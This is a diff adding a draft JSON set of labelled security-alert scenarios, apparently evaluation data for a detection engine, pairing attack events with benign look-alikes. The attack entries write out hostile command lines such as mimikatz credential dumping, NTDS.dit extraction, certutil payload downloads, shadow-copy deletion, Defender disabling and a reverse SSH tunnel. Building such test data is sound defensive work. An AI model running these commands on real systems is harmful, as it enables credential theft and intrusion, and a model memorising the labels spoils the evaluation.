@@ -1,0 +1,1310 @@
+{
+  "version": 1,
+  "status": "DRAFT - labels proposed by Claude, pending review by Kevin",
+  "labelling_guide": "evals/system_one/README.md",
+  "scenarios": [
+    {
+      "id": "tp-ransomware-precursor",
+      "kind": "true_positive",
+      "title": "Shadow copies deleted, then ransomware binary encrypts files",
+      "story": "Operator wipes recovery points and launches the encryptor on a file server.",
+      "visible_evidence": "vssadmin delete shadows followed by LockBit.exe -encrypt on the same host",
+      "labels": {
+        "malicious": true,
+        "severity": "critical",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Active destruction in progress; containment now.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-02T02:11:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "svc-print",
+          "host": "fs-02",
+          "process_name": "vssadmin.exe",
+          "command_line": "vssadmin.exe delete shadows /all /quiet"
+        },
+        {
+          "timestamp": "2026-09-02T02:12:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "svc-print",
+          "host": "fs-02",
+          "process_name": "LockBit.exe",
+          "command_line": "LockBit.exe -encrypt D:\\Shares\\Finance"
+        }
+      ]
+    },
+    {
+      "id": "tp-mimikatz-lsass",
+      "kind": "true_positive",
+      "title": "Mimikatz dumps LSASS on a user workstation",
+      "story": "Attacker with local admin harvests credentials from memory.",
+      "visible_evidence": "mimikatz.exe with sekurlsa::logonpasswords on a non-IT workstation",
+      "labels": {
+        "malicious": true,
+        "severity": "critical",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Credential theft means every logged-on account is compromised.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-03T23:40:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "jordan",
+          "host": "ws-114",
+          "process_name": "mimikatz.exe",
+          "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
+        }
+      ]
+    },
+    {
+      "id": "tp-ntds-extraction",
+      "kind": "true_positive",
+      "title": "NTDS.dit copied off a domain controller",
+      "story": "Attacker uses ntdsutil IFM to take the whole AD credential database.",
+      "visible_evidence": "ntdsutil ifm create full run by a non-admin account on dc-01",
+      "labels": {
+        "malicious": true,
+        "severity": "critical",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Full domain compromise; every credential must be treated as stolen.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-04T03:05:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "jordan",
+          "host": "dc-01",
+          "process_name": "ntdsutil.exe",
+          "command_line": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\x\" q q"
+        }
+      ]
+    },
+    {
+      "id": "tp-phish-to-encoded-powershell",
+      "kind": "true_positive",
+      "title": "Phishing email, then encoded PowerShell on the recipient's machine",
+      "story": "User opens a malicious attachment which launches a stager.",
+      "visible_evidence": "phishing_email_received with an .exe attachment, then powershell -enc from the same user",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Delivery plus execution: the endpoint is compromised.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-05T09:02:00Z",
+          "outcome": "delivered",
+          "category": "email",
+          "action": "phishing_email_received",
+          "user": "priya",
+          "host": "mail-gw",
+          "src_ip": "198.51.100.99",
+          "subject": "Invoice overdue - action required",
+          "attachment": "invoice_0923.exe"
+        },
+        {
+          "timestamp": "2026-09-05T09:04:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "priya",
+          "host": "ws-201",
+          "process_name": "powershell.exe",
+          "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+          "parent_process": "invoice_0923.exe"
+        }
+      ]
+    },
+    {
+      "id": "tp-password-spray-then-success",
+      "kind": "true_positive",
+      "title": "Failed logins from one external IP, then a success",
+      "story": "Password spray lands on a real account from an unfamiliar address.",
+      "visible_evidence": "several login_failed from 203.0.113.77 then login_success for the same user from the same IP",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "medium",
+      "rationale": "A spray that ends in a success is an account takeover until disproven.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-06T04:00:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "203.0.113.77",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-06T04:01:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "203.0.113.77",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-06T04:02:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "203.0.113.77",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-06T04:03:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "203.0.113.77",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-06T04:04:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "203.0.113.77",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-06T04:06:00Z",
+          "outcome": "success",
+          "category": "authentication",
+          "action": "login_success",
+          "user": "devon",
+          "src_ip": "203.0.113.77",
+          "host": "vpn-1"
+        }
+      ]
+    },
+    {
+      "id": "tp-certutil-download",
+      "kind": "true_positive",
+      "title": "cmd.exe uses certutil to pull an executable from a bare IP",
+      "story": "Living-off-the-land download of a second stage.",
+      "visible_evidence": "certutil -urlcache -split -f from an http:// bare IP into AppData\\Temp",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "high",
+      "rationale": "certutil as a downloader from a raw IP has almost no benign use.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-07T13:20:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "omar",
+          "host": "ws-088",
+          "process_name": "cmd.exe",
+          "command_line": "cmd.exe /c certutil -urlcache -split -f http://198.51.100.25/u.exe C:\\Users\\omar\\AppData\\Local\\Temp\\u.exe"
+        }
+      ]
+    },
+    {
+      "id": "tp-wmic-lateral-movement",
+      "kind": "true_positive",
+      "title": "WMIC spawns a process on a finance server from a workstation",
+      "story": "Attacker pivots from a compromised laptop to a finance host.",
+      "visible_evidence": "wmic /node:finance-02 process call create from a non-IT user's workstation",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Lateral movement in progress toward a sensitive system.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-08T01:15:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "jordan",
+          "host": "ws-114",
+          "process_name": "wmic.exe",
+          "command_line": "wmic /node:finance-02 process call create \"cmd.exe /c whoami\""
+        }
+      ]
+    },
+    {
+      "id": "tp-security-log-cleared",
+      "kind": "true_positive",
+      "title": "Security event log cleared at 3am by a user account",
+      "story": "Attacker covers tracks after activity.",
+      "visible_evidence": "wevtutil cl security from a regular user at night",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "high",
+      "rationale": "Clearing the security log is anti-forensics; something preceded it.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-09T03:02:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "omar",
+          "host": "ws-088",
+          "process_name": "wevtutil.exe",
+          "command_line": "wevtutil cl security"
+        }
+      ]
+    },
+    {
+      "id": "tp-defender-disabled-then-download",
+      "kind": "true_positive",
+      "title": "Defender real-time protection disabled, then a download cradle",
+      "story": "Attacker blinds the endpoint before bringing in tooling.",
+      "visible_evidence": "Set-MpPreference -DisableRealtimeMonitoring then certutil download on the same host minutes later",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Defense evasion followed by tool transfer.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-10T22:30:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "priya",
+          "host": "ws-201",
+          "process_name": "powershell.exe",
+          "command_line": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+        },
+        {
+          "timestamp": "2026-09-10T22:31:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "priya",
+          "host": "ws-201",
+          "process_name": "cmd.exe",
+          "command_line": "cmd.exe /c certutil -urlcache -f http://203.0.113.50/t.exe t.exe"
+        }
+      ]
+    },
+    {
+      "id": "tp-backdoor-local-admin",
+      "kind": "true_positive",
+      "title": "New local account created and added to Administrators",
+      "story": "Attacker plants a persistent admin account.",
+      "visible_evidence": "net user support_admin /add then net localgroup administrators support_admin /add, from a user workstation",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "medium",
+      "rationale": "Unexpected local admin creation outside the provisioning path.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-11T02:40:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "jordan",
+          "host": "ws-114",
+          "process_name": "net.exe",
+          "command_line": "net user support_admin P@ssw0rd123 /add"
+        },
+        {
+          "timestamp": "2026-09-11T02:41:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "jordan",
+          "host": "ws-114",
+          "process_name": "net.exe",
+          "command_line": "net localgroup administrators support_admin /add"
+        }
+      ]
+    },
+    {
+      "id": "tp-staged-exfil",
+      "kind": "true_positive",
+      "title": "Finance share archived with a password, then 80 MB leaves the network",
+      "story": "Insider or attacker stages and exfiltrates data.",
+      "visible_evidence": "7z a -p on a Finance path, then an outbound data_transfer of ~80 MB to an external IP",
+      "labels": {
+        "malicious": true,
+        "severity": "critical",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Confirmed data leaving the organisation.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-12T20:10:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "omar",
+          "host": "ws-088",
+          "process_name": "7z.exe",
+          "command_line": "7z.exe a -pS3cret -mhe=on C:\\Users\\omar\\x.7z \\\\fs-02\\Finance\\*"
+        },
+        {
+          "timestamp": "2026-09-12T20:25:00Z",
+          "outcome": "success",
+          "category": "network",
+          "action": "data_transfer",
+          "user": "omar",
+          "host": "ws-088",
+          "src_ip": "10.0.8.88",
+          "dst_ip": "203.0.113.99",
+          "direction": "outbound",
+          "bytes_sent": 83886080,
+          "protocol": "https"
+        }
+      ]
+    },
+    {
+      "id": "tp-reverse-ssh-tunnel",
+      "kind": "true_positive",
+      "title": "Reverse SSH tunnel from a workstation to an external host",
+      "story": "Attacker opens a persistent channel back into the network.",
+      "visible_evidence": "ssh.exe -R to an external IP from a non-engineering workstation",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "medium",
+      "rationale": "Reverse tunnels bypass inbound firewalling.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-13T00:30:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "priya",
+          "host": "ws-201",
+          "process_name": "ssh.exe",
+          "command_line": "ssh.exe -N -R 9001:localhost:3389 root@203.0.113.99"
+        }
+      ]
+    },
+    {
+      "id": "tp-web-probe-single",
+      "kind": "true_positive",
+      "title": "One path-traversal probe against a public web server",
+      "story": "Internet background noise from an automated scanner.",
+      "visible_evidence": "single /etc/passwd traversal request from an external IP, generic scanner user agent",
+      "labels": {
+        "malicious": true,
+        "severity": "low",
+        "action": "monitor"
+      },
+      "label_confidence": "medium",
+      "rationale": "Malicious intent, but one probe against a public host is routine noise.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-14T11:00:00Z",
+          "outcome": "success",
+          "category": "network",
+          "action": "http_request",
+          "user": "anonymous",
+          "host": "web-01",
+          "src_ip": "198.51.100.140",
+          "dst_ip": "10.0.1.10",
+          "url": "/cgi-bin/view.php?f=../../../../etc/passwd",
+          "user_agent": "Mozilla/5.0 zgrab/0.x"
+        }
+      ]
+    },
+    {
+      "id": "tp-departing-dev-destroys-repo",
+      "kind": "true_positive",
+      "title": "Branch protection removed, then the repository deleted",
+      "story": "Departing engineer sabotages a production repository.",
+      "visible_evidence": "protected_branch.destroy followed by repo.destroy by the same user",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "escalate"
+      },
+      "label_confidence": "high",
+      "rationale": "Destructive action against source control; restore and contain.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-15T18:00:00Z",
+          "outcome": "success",
+          "category": "cloud",
+          "action": "protected_branch.destroy",
+          "user": "sam",
+          "host": "github",
+          "cloud_account": "acme-org",
+          "resource": "acme-org/payments-api"
+        },
+        {
+          "timestamp": "2026-09-15T18:02:00Z",
+          "outcome": "success",
+          "category": "cloud",
+          "action": "repo.destroy",
+          "user": "sam",
+          "host": "github",
+          "cloud_account": "acme-org",
+          "resource": "acme-org/payments-api"
+        }
+      ]
+    },
+    {
+      "id": "tp-svchost-from-temp",
+      "kind": "true_positive",
+      "title": "svchost.exe running out of a user Temp directory",
+      "story": "Malware masquerading as a system process.",
+      "visible_evidence": "svchost.exe executing from C:\\Users\\...\\AppData\\Local\\Temp",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "high",
+      "rationale": "The real svchost only runs from System32.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-16T10:45:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "omar",
+          "host": "ws-088",
+          "process_name": "svchost.exe",
+          "command_line": "C:\\Users\\omar\\AppData\\Local\\Temp\\svchost.exe -k netsvcs"
+        }
+      ]
+    },
+    {
+      "id": "tp-schtasks-system-payload",
+      "kind": "true_positive",
+      "title": "Scheduled task created to run a Temp payload as SYSTEM",
+      "story": "Persistence mechanism for an implant.",
+      "visible_evidence": "schtasks /create /ru SYSTEM pointing at an executable in AppData\\Temp, from a user account",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "investigate"
+      },
+      "label_confidence": "high",
+      "rationale": "SYSTEM-level persistence for a binary in a temp path.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-17T01:12:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "jordan",
+          "host": "ws-114",
+          "process_name": "schtasks.exe",
+          "command_line": "schtasks /create /sc onlogon /ru SYSTEM /tn Updater /tr C:\\Users\\jordan\\AppData\\Local\\Temp\\upd.exe"
+        }
+      ]
+    },
+    {
+      "id": "tp-domain-recon-by-sales-user",
+      "kind": "true_positive",
+      "title": "Domain admin and DC enumeration from a sales laptop",
+      "story": "Post-compromise discovery from an account with no reason to run it.",
+      "visible_evidence": "net group \"domain admins\" /domain and nltest /dclist from a sales user's laptop",
+      "labels": {
+        "malicious": true,
+        "severity": "medium",
+        "action": "investigate"
+      },
+      "label_confidence": "medium",
+      "rationale": "Discovery is early-stage; worth working before it progresses.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-18T14:03:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "lena",
+          "host": "lt-sales-07",
+          "process_name": "net.exe",
+          "command_line": "net group \"domain admins\" /domain"
+        },
+        {
+          "timestamp": "2026-09-18T14:04:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "lena",
+          "host": "lt-sales-07",
+          "process_name": "nltest.exe",
+          "command_line": "nltest /dclist:acme.local"
+        }
+      ]
+    },
+    {
+      "id": "tp-cloud-admin-after-failures",
+      "kind": "true_positive",
+      "title": "Failed logins then AssumeRole into the production admin role",
+      "story": "Stolen credentials used to escalate in the cloud account.",
+      "visible_evidence": "login_failed burst from an external IP, then AssumeRole AdminRole in prod from that IP",
+      "labels": {
+        "malicious": true,
+        "severity": "high",
+        "action": "escalate"
+      },
+      "label_confidence": "medium",
+      "rationale": "Privileged cloud access right after a credential attack.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-19T05:00:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "198.51.100.25",
+          "host": "aws-console"
+        },
+        {
+          "timestamp": "2026-09-19T05:01:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "198.51.100.25",
+          "host": "aws-console"
+        },
+        {
+          "timestamp": "2026-09-19T05:02:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "devon",
+          "src_ip": "198.51.100.25",
+          "host": "aws-console"
+        },
+        {
+          "timestamp": "2026-09-19T05:05:00Z",
+          "outcome": "success",
+          "category": "cloud",
+          "action": "AssumeRole",
+          "user": "devon",
+          "src_ip": "198.51.100.25",
+          "cloud_account": "prod",
+          "resource": "AdminRole"
+        }
+      ]
+    },
+    {
+      "id": "tp-phish-quarantined",
+      "kind": "true_positive",
+      "title": "Phishing email detected and quarantined, never opened",
+      "story": "Real phishing, stopped at the gateway.",
+      "visible_evidence": "phishing_email_received with outcome quarantined and no follow-on activity",
+      "labels": {
+        "malicious": true,
+        "severity": "low",
+        "action": "monitor"
+      },
+      "label_confidence": "medium",
+      "rationale": "Malicious, but contained with no user interaction.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-20T08:30:00Z",
+          "outcome": "quarantined",
+          "category": "email",
+          "action": "phishing_email_received",
+          "user": "lena",
+          "host": "mail-gw",
+          "src_ip": "198.51.100.99",
+          "subject": "Your mailbox is full",
+          "attachment": "view.html"
+        }
+      ]
+    },
+    {
+      "id": "fp-typo-then-success",
+      "kind": "false_positive",
+      "title": "One failed login followed by a success from the office IP",
+      "story": "User mistypes their password once at 9am.",
+      "visible_evidence": "single login_failed then login_success, same internal IP, business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "high",
+      "rationale": "Ordinary user error.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-02T09:00:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "lena",
+          "src_ip": "10.0.4.21",
+          "host": "sso"
+        },
+        {
+          "timestamp": "2026-09-02T09:00:30Z",
+          "outcome": "success",
+          "category": "authentication",
+          "action": "login_success",
+          "user": "lena",
+          "src_ip": "10.0.4.21",
+          "host": "sso"
+        }
+      ]
+    },
+    {
+      "id": "fp-helpdesk-systeminfo",
+      "kind": "false_positive",
+      "title": "Helpdesk runs systeminfo and ipconfig while on a ticket",
+      "story": "IT troubleshooting a user's laptop.",
+      "visible_evidence": "it-marco (IT account) running systeminfo and ipconfig /all, business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "high",
+      "rationale": "Routine IT diagnostics by an IT account.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-03T10:15:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-sales-07",
+          "process_name": "systeminfo.exe",
+          "command_line": "systeminfo"
+        },
+        {
+          "timestamp": "2026-09-03T10:16:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-sales-07",
+          "process_name": "ipconfig.exe",
+          "command_line": "ipconfig /all"
+        }
+      ]
+    },
+    {
+      "id": "fp-sccm-maintenance-task",
+      "kind": "false_positive",
+      "title": "SCCM agent registers a maintenance scheduled task",
+      "story": "Configuration management creating its own maintenance job.",
+      "visible_evidence": "schtasks /create run by svc-sccm with parent_process ccmexec.exe pointing at the CCM directory",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "high",
+      "rationale": "Endpoint management doing its job.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-04T02:00:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "svc-sccm",
+          "host": "ws-201",
+          "process_name": "schtasks.exe",
+          "command_line": "schtasks /create /sc daily /tn \"Configuration Manager Health Evaluation\" /tr C:\\Windows\\CCM\\ccmeval.exe",
+          "parent_process": "ccmexec.exe"
+        }
+      ]
+    },
+    {
+      "id": "fp-backup-shadow-copy",
+      "kind": "false_positive",
+      "title": "Backup software creates a shadow copy on the domain controller",
+      "story": "Nightly system-state backup; the credential-theft rule fires on vssadmin create shadow.",
+      "visible_evidence": "svc-backup running vssadmin create shadow, parent_process VeeamAgent.exe, 01:00 nightly",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "high",
+      "rationale": "Scheduled backup; engine rates this critical, which is the false alarm under test.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-05T01:00:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "svc-backup",
+          "host": "dc-01",
+          "process_name": "vssadmin.exe",
+          "command_line": "vssadmin create shadow /for=C:",
+          "parent_process": "VeeamAgent.exe"
+        }
+      ]
+    },
+    {
+      "id": "fp-admin-ssh-port-forward",
+      "kind": "false_positive",
+      "title": "Engineer opens an SSH local port-forward to the bastion",
+      "story": "Standard way to reach an internal database through the jump host.",
+      "visible_evidence": "ssh.exe -L to bastion.acme.internal by an engineering user",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "Sanctioned access pattern via the corporate bastion.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-06T15:20:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "devon",
+          "host": "lt-eng-03",
+          "process_name": "ssh.exe",
+          "command_line": "ssh.exe -L 5432:db-prod.internal:5432 devon@bastion.acme.internal"
+        }
+      ]
+    },
+    {
+      "id": "fp-it-anydesk-session",
+      "kind": "false_positive",
+      "title": "IT support starts an AnyDesk session for a user",
+      "story": "Helpdesk uses the sanctioned remote-support tool.",
+      "visible_evidence": "AnyDesk.exe launched by it-marco from the managed Program Files path during business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "Approved remote support by the IT team.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-07T11:00:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-it-01",
+          "process_name": "AnyDesk.exe",
+          "command_line": "\"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --control"
+        }
+      ]
+    },
+    {
+      "id": "fp-ansible-encoded-command",
+      "kind": "false_positive",
+      "title": "Ansible runs powershell -EncodedCommand over WinRM",
+      "story": "Ansible's Windows modules send scripts base64-encoded; the encoded-PowerShell rules fire on it.",
+      "visible_evidence": "svc-ansible on a managed server, parent_process wsmprovhost.exe (WinRM), business-hours deploy window",
+      "labels": {
+        "malicious": false,
+        "severity": "low",
+        "action": "enrich"
+      },
+      "label_confidence": "medium",
+      "rationale": "Very likely Ansible, but encoded PowerShell deserves a check against the deploy log.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-08T13:00:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "svc-ansible",
+          "host": "app-srv-04",
+          "process_name": "powershell.exe",
+          "command_line": "powershell.exe -NoProfile -NonInteractive -EncodedCommand UABhAHIAYQBtACgAWwBzAHQAcgBpAG4AZwBdACQAagBzAG8AbgApAA==",
+          "parent_process": "wsmprovhost.exe"
+        }
+      ]
+    },
+    {
+      "id": "fp-offboarding-remove-member",
+      "kind": "false_positive",
+      "title": "Org admin removes a departed employee from GitHub",
+      "story": "Offboarding checklist step.",
+      "visible_evidence": "org.remove_member by the GitHub org admin account for a user flagged as departed",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "high",
+      "rationale": "Expected offboarding action by the right account.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-09T16:00:00Z",
+          "outcome": "success",
+          "category": "cloud",
+          "action": "org.remove_member",
+          "user": "github-admin",
+          "host": "github",
+          "cloud_account": "acme-org",
+          "resource": "member:sam"
+        }
+      ]
+    },
+    {
+      "id": "fp-ci-assumes-deploy-admin",
+      "kind": "false_positive",
+      "title": "CI pipeline role assumes the production admin role to deploy",
+      "story": "Terraform apply from the deploy pipeline.",
+      "visible_evidence": "AssumeRole AdminRole by gha-deploy (CI identity) from a GitHub Actions address range",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "The deploy identity doing a deploy; least-privilege concern, not an attack.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-10T12:00:00Z",
+          "outcome": "success",
+          "category": "cloud",
+          "action": "AssumeRole",
+          "user": "gha-deploy",
+          "src_ip": "140.82.112.4",
+          "cloud_account": "prod",
+          "resource": "AdminRole",
+          "user_agent": "terraform/1.9 aws-sdk-go-v2"
+        }
+      ]
+    },
+    {
+      "id": "fp-journald-vacuum-cron",
+      "kind": "false_positive",
+      "title": "Ops cron job vacuums old journald logs",
+      "story": "Disk-space housekeeping, matched by the log-clearing rule.",
+      "visible_evidence": "journalctl --vacuum-time=14d run by root from cron at 04:00",
+      "labels": {
+        "malicious": false,
+        "severity": "low",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "Retention housekeeping; worth confirming it matches the retention policy once.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-11T04:00:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "root",
+          "host": "log-01",
+          "process_name": "journalctl",
+          "command_line": "journalctl --vacuum-time=14d",
+          "parent_process": "cron"
+        }
+      ]
+    },
+    {
+      "id": "fp-helpdesk-new-hire-account",
+      "kind": "false_positive",
+      "title": "Helpdesk creates a local account for a new hire's kiosk",
+      "story": "Provisioning done by IT on an IT host.",
+      "visible_evidence": "net user kiosk-lobby /add run by it-marco on lt-it-01 during business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "Provisioning by IT; no admin group change.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-12T10:30:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-it-01",
+          "process_name": "net.exe",
+          "command_line": "net user kiosk-lobby Welcome2026! /add"
+        }
+      ]
+    },
+    {
+      "id": "fp-marketing-video-upload",
+      "kind": "false_positive",
+      "title": "Marketing uploads a 60 MB video to the agency",
+      "story": "Large outbound transfer to a known vendor during work hours.",
+      "visible_evidence": "upload of ~60 MB by the marketing user to the agency file-share domain, business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "monitor"
+      },
+      "label_confidence": "medium",
+      "rationale": "Business transfer; volume alone is not exfiltration.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-13T14:00:00Z",
+          "outcome": "success",
+          "category": "network",
+          "action": "upload",
+          "user": "lena",
+          "host": "lt-mkt-02",
+          "src_ip": "10.0.6.12",
+          "dst_ip": "104.16.0.10",
+          "direction": "outbound",
+          "bytes_sent": 62914560,
+          "protocol": "https",
+          "url": "https://share.agency-partner.example/upload"
+        }
+      ]
+    },
+    {
+      "id": "fp-internal-vuln-scan",
+      "kind": "false_positive",
+      "title": "Internal vulnerability scanner probes the web server",
+      "story": "Scheduled authenticated scan; traversal payloads are part of the scan.",
+      "visible_evidence": "traversal request from the scanner's internal IP with a Nessus user agent",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "high",
+      "rationale": "Our own scanner.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-14T01:00:00Z",
+          "outcome": "success",
+          "category": "network",
+          "action": "http_request",
+          "user": "svc-scanner",
+          "host": "web-01",
+          "src_ip": "10.0.9.5",
+          "dst_ip": "10.0.1.10",
+          "url": "/index.php?page=../../../etc/passwd",
+          "user_agent": "Mozilla/5.0 (compatible; Nessus SOAP)"
+        }
+      ]
+    },
+    {
+      "id": "fp-support-bundle-archive",
+      "kind": "false_positive",
+      "title": "Admin creates a password-protected log bundle for a vendor ticket",
+      "story": "Encrypted archive of application logs for vendor support.",
+      "visible_evidence": "7z a -p on an application log directory by an IT account, file named support ticket",
+      "labels": {
+        "malicious": false,
+        "severity": "low",
+        "action": "monitor"
+      },
+      "label_confidence": "medium",
+      "rationale": "Sanctioned but worth noting: logs leaving via a vendor channel.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-15T11:20:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
